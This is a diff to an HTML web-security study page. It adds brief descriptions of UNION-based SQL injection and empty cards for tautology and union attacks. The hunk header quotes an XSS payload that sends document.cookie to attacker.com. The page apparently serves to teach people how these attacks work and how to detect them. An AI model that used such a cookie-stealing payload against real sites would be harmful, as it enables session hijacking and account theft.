@@ -450,10 +450,15 @@ fetch('https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie)
                     <p>There are many types of SQL injections simply we are looking for any requests that could possibily involve the db. Here are some sqli techniques:</p>
                     <ul class="indented-list">
                         <li><strong>Tautology Attack:</strong> The main idea here is to target WHERE clause to always evaluate to true, often using comments like <code>--</code> to bypass authentication.</li>
-                        <li><strong>Union Attack:</strong> </li>
+                        <li><strong>Union Attack:</strong> One of the more complex attacks which is mainly used to extract information from a database using UNION. </li>
                     </ul>
                 </div>
-                
+                <div class="card">
+                    <h3>Tautology Attack</h3>
+                </div>
+                <div class="card">
+                    <h3>Union Attack</h3>
+                </div>
                 <div class="card">
                     <h3 class="card-title">Error-Based Detection</h3>
                     <p>Look for database errors that reveal SQL injection vulnerabilities:</p>
